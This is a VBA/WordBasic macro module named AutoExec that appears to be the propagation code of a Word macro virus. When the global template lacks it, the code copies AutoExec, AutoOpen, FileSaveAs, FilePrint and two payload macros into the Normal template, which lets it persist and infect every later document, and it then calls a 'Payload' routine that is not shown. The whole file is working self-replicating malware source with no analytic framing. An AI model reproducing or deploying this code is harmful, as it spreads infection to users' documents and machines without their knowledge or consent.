   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   If CheckInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
   Rem     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro", 1
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload"
   End If
   WordBasic.Call "Payload"
   End Sub

   Private Function CheckInstalled()
   Dim i
       'Check if AutoExec macro already exists.
       CheckInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function
